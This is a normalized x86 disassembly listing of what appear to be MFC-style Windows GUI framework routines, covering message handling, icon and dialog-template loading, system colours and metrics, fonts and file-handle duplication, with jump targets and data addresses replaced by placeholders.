mov ecx eax
call [ edx + 0x64 ]
test eax eax
je r-xdata
push 0x1
mov ecx esi
call sub_41f2d2
push [ esi + 0x1c ]
call ebx
mov [ esp + 0x10 ] edi
cmp eax 0x104
jne r-xdata
test [ esp + 0x24 ] 0x2
jne r-xdata
cmp [ esp + 0x1c ] edi
je r-xdata
push edi
push edi
push edi
push edi
push ebp
call [ PeekMessageA@IAT ]
test eax eax
jne r-xdata
mov [ esp + 0x18 ] 0x1
mov [ esp + 0x14 ] edi
mov [ esp + 0x18 ] edi
jmp r-xdata
mov eax [ esp + 0x14 ]
inc [ esp + 0x14 ]
push eax
push edi
push 0x36a
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
test eax eax
jne r-xdata
cmp [ esp + 0x14 ] edi
jne r-xdata
jmp r-xdata
cmp [ esp + 0x18 ] edi
je r-xdata
push [ esi + 0x1c ]
push edi
push 0x121
push [ esp + 0x28 ]
call [ SendMessageA@IAT ]
sub_41ed40
mov eax [ esp + 0x4 ]
mov [ ecx + 0x2c ] eax
mov eax [ ecx + 0x24 ]
test al 0x10
je r-xdata
retn 0x4
and al 0xef
mov [ ecx + 0x24 ] eax
xor eax eax
push eax
push eax
push eax
push [ ecx + 0x1c ]
call [ PostMessageA@IAT ]
sub_41ed64
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov [ esi + 0x24 ] eax
call sub_422d64
movzx ecx [ esp + 0x14 ]
mov eax [ eax + 0xc ]
mov edi [ LoadIconA@IAT ]
push ecx
push eax
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
push esi
call sub_41d707
pop edi
pop esi
retn 0xc
push 0x7f00
push eax
call edi
mov [ esi + 0x14 ] eax
sub_41eda5
push ebx
push esi
mov esi r--data
push edi
push esi
call [ GetModuleHandleA@IAT ]
push esi
mov edi eax
call [ LoadLibraryA@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
push r--data
push ebx
xor esi esi
call [ GetProcAddress@IAT ]
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call eax
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov edi 0x3fc0
and eax edi
cmp eax [ esp + 0x14 ]
jne r-xdata
push ebx
call [ FreeLibrary@IAT ]
mov eax esi
mov esi [ esp + 0x14 ]
test edi edi
jne r-xdata
call [ InitCommonControls@IAT ]
mov esi edi
jmp r-xdata
call [ InitCommonControls@IAT ]
or si 0x3fc0
sub_41ee1c
push ebp
mov ebp esp
sub esp 0x34
call sub_422d64
mov [ ebp - 0x4 ] eax
mov eax [ eax + 0x18 ]
not eax
and [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push esi
push edi
xor edi edi
push 0x28
lea eax [ ebp - 0x34 ]
push edi
push eax
xor esi esi
call sub_40cc70
mov eax [ DefWindowProcA@IAT ]
add esp 0xc
mov [ ebp - 0x30 ] eax
call sub_422d64
mov eax [ eax + 0x8 ]
push 0x8
test [ ebp + 0x8 ] 0x1
mov [ ebp - 0x24 ] eax
mov eax [ rw-data ]
pop ebx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0xc ] ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
test [ ebp + 0x8 ] 0x20
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] 0xb
push eax
mov [ ebp - 0x10 ] r--data
call sub_41d707
test eax eax
je r-xdata
leave
retn 0x4
test [ ebp + 0x8 ] 0x2
je r-xdata
or [ ebp - 0x34 ] 0x8b
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_41d707
test eax eax
je r-xdata
push 0x1
pop esi
test [ ebp + 0x8 ] 0x4
je r-xdata
lea eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] edi
push eax
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0x18 ] 0x10
call sub_41d707
test eax eax
je r-xdata
or esi 0x20
test [ ebp + 0x8 ] bl
je r-xdata
push 0x7a01
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] edi
call sub_41ed64
test eax eax
je r-xdata
or esi 0x2
test [ ebp + 0x8 ] 0x10
je r-xdata
push 0x7a02
lea eax [ ebp - 0x34 ]
push r--data
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_41ed64
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
lea eax [ ebp - 0xc ]
push 0x3fc0
push eax
mov [ ebp - 0x8 ] 0xff
call sub_41eda5
or esi eax
and [ ebp + 0x8 ] 0xc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
lea eax [ ebp - 0xc ]
push 0x40
push eax
mov [ ebp - 0x8 ] 0x10
call sub_41eda5
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x80
push eax
mov [ ebp - 0x8 ] 0x2
call sub_41eda5
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_41eda5
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_41eda5
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
mov [ ebp - 0x8 ] 0x1
call sub_41eda5
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push edi
push eax
mov [ ebp - 0x8 ] 0x40
call sub_41eda5
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_41eda5
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_41eda5
or esi eax
mov eax 0x8000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_41eda5
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_41eda5
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_41eda5
or esi eax
mov ecx [ ebp - 0x4 ]
mov edx 0x3fc0
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_41eda5
or esi eax
mov eax esi
pop edi
and eax [ ebp + 0x8 ]
pop esi
pop ebx
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
or al 0x10
or esi 0x10
mov [ ecx + 0x18 ] eax
sub_41f0f2
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0x80 ]
mov edi eax
push [ edi ]
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
and [ edi ] 0x0
mov ecx esi
call sub_41cc49
pop edi
pop esi
retn
sub_41f140
mov eax [ ecx + 0x34 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0x70 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ GetDlgItem@IAT ]
push eax
call sub_41cbcb
jmp r-xdata
retn 0x4
sub_41f16a
push esi
mov esi ecx
test [ esi + 0x25 ] 0x1
je r-xdata
push [ esp + 0x8 ]
push [ esi + 0x1c ]
call [ IsDialogMessageA@IAT ]
call sub_422d64
mov eax [ eax + 0x1038 ]
push [ esp + 0x8 ]
mov ecx eax
mov edx [ eax ]
push esi
call [ edx + 0x24 ]
jmp r-xdata
pop esi
retn 0x4
sub_41f1f8
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ esp + 0x8 ]
mov edx [ eax ]
mov ecx eax
push [ esp + 0x8 ]
call [ edx + 0x84 ]
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x1c ]
call [ GetWindowTextA@IAT ]
jmp r-xdata
retn 0x8
sub_41f242
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x18 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x98 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x1c ]
call [ MoveWindow@IAT ]
jmp r-xdata
pop ebp
retn 0x14
sub_41f283
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x1c ]
call [ SetWindowPos@IAT ]
jmp r-xdata
mov eax [ eax + 0x1c ]
pop ebp
retn 0x18
sub_41f35c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
pop ebp
retn
lea edx [ ebp + 0x20 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x58 ]
sub_41f3a5
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ eax + 0x4 ]
call sub_41aa65
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x8c ]
sub_41f3e2
push esi
mov esi [ esp + 0x8 ]
add ecx 0x20
push [ esi + 0x1c ]
call sub_41aa65
test eax eax
je r-xdata
pop esi
retn 0x4
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov [ esi + 0x38 ] eax
mov [ eax + 0x24 ] esi
cmp [ ecx + 0x38 ] eax
jne r-xdata
and [ ecx + 0x38 ] 0x0
sub_41f410
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi 0x100
push edi
lea eax [ ebp - 0x104 ]
push esi
push eax
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ecx
call sub_41f494
mov edi eax
mov eax esi
sub eax edi
cmp eax 0x2
jbe r-xdata
push ebx
mov edi esi
mov ecx [ ebp - 0x4 ]
lea eax [ ebp - 0x104 ]
push eax
call sub_41c49d
xor eax eax
test edi edi
setg al
jmp r-xdata
mov ecx [ ebp - 0x4 ]
add edi esi
push edi
lea eax [ edi - 0x1 ]
push eax
call sub_41c5cf
push eax
push [ ebp + 0x8 ]
call sub_41f494
mov ebx eax
mov eax edi
sub eax ebx
cmp eax 0x2
jle r-xdata
mov ecx [ ebp - 0x4 ]
push 0xffffffff
call sub_41c61e
xor eax eax
test ebx ebx
setg al
pop ebx
pop edi
pop esi
leave
retn 0x4
sub_41f494
push esi
call sub_422d64
push [ esp + 0x10 ]
mov esi [ esp + 0x10 ]
mov eax [ eax + 0xc ]
push esi
push [ esp + 0x10 ]
push eax
call [ LoadStringA@IAT ]
test eax eax
jne r-xdata
pop esi
retn 0xc
and [ esi ] al
sub_41f4bb
mov eax sub_425fce
call sub_40cc20
push esi
call sub_422d8a
mov esi eax
cmp [ esi + 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ esi + 0x18 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x4
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push ebx
push sub_421452
call sub_41b7f4
push 0x48
mov ebx eax
call sub_41b806
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
xor eax eax
push 0x1
push 0x4
push r--data
call sub_41f850
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
push ebx
mov [ esi + 0x18 ] eax
call sub_41b7f4
pop ebx
sub_41f560
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
and [ esi + 0x4 ] 0x0
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41f4bb
test eax eax
je r-xdata
push [ esi + 0x4 ]
lea ecx [ eax + 0x4 ]
call sub_41aae8
sub_41f5d5
mov eax sub_4260e8
call sub_40cc20
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
cmp [ ecx + 0xc ] eax
mov [ ebp - 0x10 ] esp
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] eax
call [ ecx + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
sub_41f65c
push ebp
mov ebp esp
sub esp 0x204
mov eax [ ecx ]
lea edx [ ebp - 0x4 ]
push edx
lea edx [ ebp - 0x204 ]
push 0x200
push edx
call [ eax + 0xc ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x204 ]
push [ ebp + 0x8 ]
push eax
call sub_421a93
jmp r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_421acb
mov [ ebp + 0xc ] 0xf020
leave
retn 0x8
sub_41f6b1
push esi
push edi
mov edi [ GetSysColor@IAT ]
mov esi ecx
push 0xf
call edi
push 0x10
mov [ esi + 0x28 ] eax
call edi
push 0x14
mov [ esi + 0x2c ] eax
call edi
push 0x12
mov [ esi + 0x30 ] eax
call edi
push 0x6
mov [ esi + 0x34 ] eax
call edi
mov edi [ GetSysColorBrush@IAT ]
push 0xf
mov [ esi + 0x38 ] eax
call edi
push 0x6
mov [ esi + 0x24 ] eax
call edi
mov [ esi + 0x20 ] eax
pop edi
pop esi
retn
sub_41f6f5
push ebx
push esi
push edi
mov edi [ GetSystemMetrics@IAT ]
mov esi ecx
push 0xb
call edi
push 0xc
mov [ esi + 0x8 ] eax
call edi
cmp [ esi + 0x68 ] 0x0
mov [ esi + 0xc ] eax
je r-xdata
call sub_423994
call sub_423964
jmp r-xdata
push 0x0
call [ GetDC@IAT ]
mov ebx [ GetDeviceCaps@IAT ]
mov edi eax
push 0x58
push edi
call ebx
push 0x5a
push edi
mov [ esi + 0x18 ] eax
call ebx
push edi
push 0x0
mov [ esi + 0x1c ] eax
call [ ReleaseDC@IAT ]
pop edi
pop esi
pop ebx
retn
sub_41f756
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_422d8a
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
cmp eax esi
je r-xdata
xor eax eax
pop edi
cmp [ ebx + 0x10 ] eax
pop esi
pop ebx
setne al
pop ebp
retn 0x4
dec eax
cmp eax esi
mov [ ebx + 0x10 ] eax
jne r-xdata
cmp [ ebp + 0x8 ] esi
je r-xdata
call sub_422d64
mov edi [ eax + 0x4 ]
push sub_422741
mov ecx rw-data
call sub_423575
test edi edi
mov esi eax
je r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x20 ]
call sub_41f974
mov ecx [ ebx + 0x1c ]
call sub_41f974
mov ecx [ ebx + 0x18 ]
call sub_41f974
mov ecx [ ebx + 0x14 ]
call sub_41f974
mov ecx [ ebx + 0x24 ]
call sub_41f974
call sub_41ad89
cmp eax esi
je r-xdata
cmp [ edi + 0xb8 ] 0x0
je r-xdata
push eax
call sub_40daf5
cmp eax [ edi + 0xb8 ]
pop ecx
jae r-xdata
mov eax [ eax + 0x54 ]
cmp eax esi
je r-xdata
mov eax [ esi + 0xc ]
and [ ebp + 0x8 ] 0x0
test eax eax
je r-xdata
push esi
push esi
call eax
push [ edi + 0xb8 ]
call sub_40bb22
test eax eax
pop ecx
mov [ esi + 0xc ] eax
jne r-xdata
push eax
call sub_40daf5
push [ esi + 0xc ]
mov [ ebp + 0x8 ] eax
call sub_40c218
pop ecx
pop ecx
cmp [ ebp + 0x8 ] eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40bb22
pop ecx
mov [ esi + 0xc ] eax
sub_41f850
mov eax sub_426132
call sub_40cc20
push ecx
push esi
mov esi ecx
push edi
push 0xa
lea ecx [ esi + 0x4 ]
mov [ ebp - 0x10 ] esi
call sub_41a8f1
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x20 ]
push 0x4
mov ecx edi
call sub_41a8f1
push 0x0
push 0x7
mov ecx edi
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
call sub_41a934
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
mov [ esi + 0x3c ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x40 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x44 ] eax
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_41f8b5
mov eax sub_42613c
call sub_40cc20
push ecx
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
test edi edi
mov [ ebp - 0x10 ] esp
mov esi ecx
jne r-xdata
push edi
lea ecx [ esi + 0x4 ]
call sub_41aa65
test eax eax
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
lea ecx [ esi + 0x20 ]
push edi
call sub_41aa65
test eax eax
je r-xdata
push sub_421452
call sub_41b7f4
mov ecx [ esi + 0x3c ]
and [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] eax
call sub_41f5d5
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx [ esi + 0x40 ]
mov [ ecx + eax ] edi
add ecx eax
cmp [ esi + 0x44 ] 0x2
jne r-xdata
push edi
lea ecx [ esi + 0x20 ]
call sub_41aa98
push [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax ] ebx
call sub_41b7f4
mov eax [ esi + 0x40 ]
mov [ eax + ebx ] edi
add eax ebx
cmp [ esi + 0x44 ] 0x2
jne r-xdata
call sub_41a429
mov [ ecx + 0x4 ] edi
jmp r-xdata
mov eax ebx
jmp r-xdata
mov [ eax + 0x4 ] edi
sub_41f974
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
leave
retn
mov eax [ esi + 0x2c ]
neg eax
sbb eax eax
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
lea ecx [ esi + 0x20 ]
call sub_41a979
push edi
lea edi [ esi + 0x20 ]
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
and [ eax + 0x4 ] 0x0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
mov ecx edi
push eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
call sub_41ab2a
mov eax [ esi + 0x40 ]
add eax [ ebp - 0x4 ]
and [ eax ] 0x0
cmp [ esi + 0x44 ] 0x2
jne r-xdata
pop edi
sub_41f9d9
push esi
push edi
mov edi [ esp + 0xc ]
xor eax eax
cmp edi eax
mov esi ecx
jne r-xdata
push edi
call sub_41fad2
pop ecx
push eax
push edi
mov ecx esi
call sub_41fa08
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
sub_41fa08
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
add eax 0x40
push eax
push 0x40
call [ GlobalAlloc@IAT ]
test eax eax
mov [ esi ] eax
je r-xdata
pop esi
retn 0x8
push edi
push eax
call [ GlobalLock@IAT ]
push [ esi + 0x4 ]
mov edi eax
push [ esp + 0x10 ]
push edi
call sub_40ce30
add esp 0xc
cmp [ edi + 0x2 ] 0xffff
jne r-xdata
mov eax [ edi ]
mov eax [ edi + 0xc ]
jmp r-xdata
push [ esi ]
not eax
shr eax 0x6
and eax 0x1
mov [ esi + 0x8 ] eax
call [ GlobalUnlock@IAT ]
push 0x1
pop eax
pop edi
sub_41fa7c
mov eax [ esp + 0x4 ]
cmp [ eax + 0x2 ] 0xffff
jne r-xdata
add eax 0x12
add eax 0x1a
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
mov cx [ eax ]
push 0x2
cmp cx 0xffff
pop edx
jne r-xdata
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
jmp r-xdata
add eax edx
test cx cx
je r-xdata
add eax 0x4
jmp r-xdata
mov cx [ eax ]
add eax edx
test cx cx
jne r-xdata
mov cx [ eax ]
jmp r-xdata
retn
sub_41fad2
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
cmp [ ebx + 0x2 ] 0xffff
push ebx
sete al
mov esi eax
call sub_41fa7c
cmp [ ebx + 0x2 ] 0xffff
pop ecx
jne r-xdata
mov ecx [ ebx ]
mov ecx [ ebx + 0xc ]
jmp r-xdata
test esi esi
je r-xdata
mov ecx esi
push edi
neg ecx
sbb ecx ecx
and ecx 0x2
inc ecx
lea edi [ eax + ecx * 2 ]
push edi
call sub_40d3c3
pop ecx
lea eax [ edi + eax * 2 + 0x2 ]
pop edi
test cl 0x40
je r-xdata
mov cx [ ebx + 0x8 ]
mov cx [ ebx + 0x10 ]
jmp r-xdata
sub eax ebx
pop esi
pop ebx
retn
neg esi
sbb esi esi
and esi 0x6
add esi 0x12
movzx edx cx
test cx cx
jbe r-xdata
add eax 0x2
add eax 0x4
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
mov cx [ eax ]
inc eax
inc eax
jmp r-xdata
add eax 0x2
add eax 0x4
jmp r-xdata
test cx cx
je r-xdata
movzx ecx [ eax ]
dec edx
lea eax [ eax + ecx + 0x2 ]
jne r-xdata
mov cx [ eax ]
inc eax
inc eax
jmp r-xdata
add eax 0x3
and al 0xfc
add eax esi
mov cx [ eax ]
cmp cx 0xffff
jne r-xdata
test cx cx
je r-xdata
sub_41fb8a
push esi
mov esi [ esp + 0x8 ]
cmp [ esi + 0x2 ] 0xffff
jne r-xdata
mov eax [ esi ]
mov eax [ esi + 0xc ]
jmp r-xdata
push esi
call sub_41fa7c
mov edx [ esp + 0x14 ]
pop ecx
mov cx [ eax ]
push 0x0
mov [ edx ] cx
xor ecx ecx
cmp [ esi + 0x2 ] 0xffff
push 0x0
push 0x20
push 0x20
setne cl
dec ecx
and ecx 0x2
inc ecx
lea esi [ eax + ecx * 2 ]
mov ecx [ esp + 0x1c ]
call sub_41c646
push eax
push 0xffffffff
push esi
push 0x0
push 0x0
call [ WideCharToMultiByte@IAT ]
mov ecx [ esp + 0xc ]
push 0xffffffff
call sub_41c61e
push 0x1
pop eax
pop esi
retn
xor eax eax
pop esi
retn
test al 0x40
jne r-xdata
sub_41fbf9
push ebp
mov ebp esp
sub esp 0x50
push edi
xor edi edi
cmp [ ecx + 0x4 ] edi
mov [ ebp - 0x8 ] ecx
jne r-xdata
push ebx
push esi
push [ ecx ]
call [ GlobalLock@IAT ]
mov ebx eax
xor ecx ecx
mov ax [ ebx + 0x2 ]
cmp ax 0xffff
sete cl
cmp ax 0xffff
mov [ ebp - 0x4 ] ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ ebx + 0xc ]
jmp r-xdata
pop edi
leave
retn 0x8
or [ ebx ] 0x40
or [ ebx + 0xc ] 0x40
jmp r-xdata
mov esi [ ebp - 0x4 ]
and eax 0x40
neg esi
sbb esi esi
mov [ ebp - 0xc ] eax
and esi 0x2
inc esi
shl esi 0x1
cmp [ ebp - 0x4 ] edi
je r-xdata
mov edx [ ebp + 0x8 ]
lea eax [ ecx + edi + 0x3 ]
and al 0xfc
lea edi [ edi + edx + 0x3 ]
mov [ ebp - 0xc ] eax
and edi 0xfffffffc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ edi + esi ]
push eax
call sub_40d3c3
pop ecx
lea ecx [ esi + eax * 2 + 0x2 ]
lea eax [ ebp - 0x50 ]
push 0x20
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push edi
push edi
call [ MultiByteToWideChar@IAT ]
lea eax [ esi + eax * 2 ]
push ebx
mov [ ebp + 0x8 ] eax
call sub_41fa7c
pop ecx
mov edi eax
xor ecx ecx
mov [ ebp - 0x10 ] edi
cmp [ ebp - 0xc ] ecx
je r-xdata
mov dx [ ebx + 0x8 ]
mov dx [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov dx [ ebp + 0xc ]
sub eax esi
push eax
mov [ ecx ] dx
lea eax [ ebp - 0x50 ]
add ecx esi
push eax
push ecx
call sub_40d490
mov esi [ ebp - 0x8 ]
sub edi [ ebp - 0xc ]
add esp 0xc
push [ esi ]
add [ esi + 0x4 ] edi
call [ GlobalUnlock@IAT ]
and [ esi + 0x8 ] 0x0
push 0x1
pop eax
pop esi
pop ebx
test dx dx
jbe r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
sub ebx eax
add ebx [ ecx + 0x4 ]
push ebx
push eax
push edi
call sub_40d490
add esp 0xc
sub_41fd13
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
mov esi [ GetStockObject@IAT ]
push edi
push 0xa
mov [ ebp - 0x4 ] ecx
pop ebx
mov edi r--data
push 0x11
call esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x40 ]
push ecx
push 0x3c
push eax
call [ GetObjectA@IAT ]
test eax eax
je r-xdata
push 0xd
call esi
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x0
lea edi [ ebp - 0x24 ]
call [ GetDC@IAT ]
mov esi eax
mov eax [ ebp - 0x40 ]
test eax eax
jge r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
push edi
call sub_41fbf9
pop edi
pop esi
pop ebx
leave
retn 0x4
mov [ ebp + 0x8 ] ebx
push 0x5a
push esi
call [ GetDeviceCaps@IAT ]
push eax
push 0x48
push [ ebp - 0x40 ]
call [ MulDiv@IAT ]
push esi
push 0x0
mov ebx eax
call [ ReleaseDC@IAT ]
neg eax
mov [ ebp - 0x40 ] eax
sub_41fdf9
mov eax sub_4265b7
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
cmp [ esi + 0x4 ] 0xffffffff
mov [ ebp - 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xc ]
call sub_41c358
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ esi + 0x8 ] 0x0
je r-xdata
call sub_4200d1
sub_41fe41
push ebp
mov ebp esp
push ecx
push ebx
push edi
mov ebx ecx
push 0x10
call sub_41b806
test eax eax
pop ecx
je r-xdata
xor edi edi
push 0xffffffff
mov ecx eax
call sub_41fdda
mov edi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
pop edi
pop ebx
leave
retn
test edi edi
je r-xdata
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
push eax
call esi
push eax
push [ ebx + 0x4 ]
call esi
push eax
call [ DuplicateHandle@IAT ]
test eax eax
pop esi
jne r-xdata
push 0x0
call [ GetLastError@IAT ]
push eax
call sub_4205db
mov eax [ edi ]
push 0x1
mov ecx edi
call [ eax + 0x4 ]
sub_41feb6
push ebp
mov ebp esp
sub esp 0x110
push ebx
push esi
mov esi ecx
push edi
mov edi [ ebp + 0xc ]
and [ esi + 0x8 ] 0x0
or [ esi + 0x4 ] 0xffffffff
lea ebx [ esi + 0xc ]
and edi 0xffff7fff
mov ecx ebx
call sub_41c2e3
push [ ebp + 0x8 ]
lea eax [ ebp - 0x110 ]
push eax
call sub_4201e2
lea eax [ ebp - 0x110 ]
mov ecx ebx
push eax
call sub_41c49d
mov eax edi
xor ecx ecx
and eax 0x3
sub eax ecx
je r-xdata
mov ecx 0x80000000
dec eax
je r-xdata
xor eax eax
cmp eax 0x10
je r-xdata
mov ecx 0x40000000
jmp r-xdata
dec eax
jne r-xdata
push 0x3
pop edi
and edi 0x2000
neg edi
